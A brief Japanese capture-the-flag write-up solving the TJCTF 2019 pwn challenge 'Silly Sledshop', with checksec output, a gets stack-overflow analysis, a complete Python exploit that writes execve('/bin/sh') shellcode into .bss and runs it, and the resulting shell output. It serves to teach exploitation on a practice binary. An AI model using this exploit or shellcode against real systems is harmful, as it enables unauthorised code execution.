# [pwn 80pts] Silly Sledshop - TJCTF 2019
32bitで全部無効です。shellcodeが動かせますね。
```
$ checksec 443fc1af632011028063e52ee67e68447bf8764e29d0f24ecf388c2e69e57522_sledshop
[*] '443fc1af632011028063e52ee67e68447bf8764e29d0f24ecf388c2e69e57522_sledshop'
    Arch:	32 bits (little endian)
    NX:		NX disabled
    SSP:	SSP disabled (No canary found)
    RELRO:	Partial RELRO
    PIE:	PIE disabled
```
IDAで見ると、getsによるスタックオーバーフロー脆弱性があります。
ということで、getsでbssセクションにシェルコードを書き込んだ後、それを実行してやりましょう。
（あれ、これ昨日ENCRYPT CTFで解いたぞ......？）

```python
from ptrlib import *

elf = ELF("./443fc1af632011028063e52ee67e68447bf8764e29d0f24ecf388c2e69e57522_sledshop")
sock = Process("./443fc1af632011028063e52ee67e68447bf8764e29d0f24ecf388c2e69e57522_sledshop")

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

plt_gets = 0x080483d0

payload = b'A' * 0x50
payload += p32(plt_gets)
payload += p32(elf.symbol("__bss_start"))
payload += p32(elf.symbol("__bss_start"))

sock.recvuntil("like?")
sock.sendline(payload)

sock.send(shellcode)

sock.interactive()
```

はいできました。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=6480)

Sorry, we are closed.
[ptrlib]$ id
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
割と簡単な問題だと思います。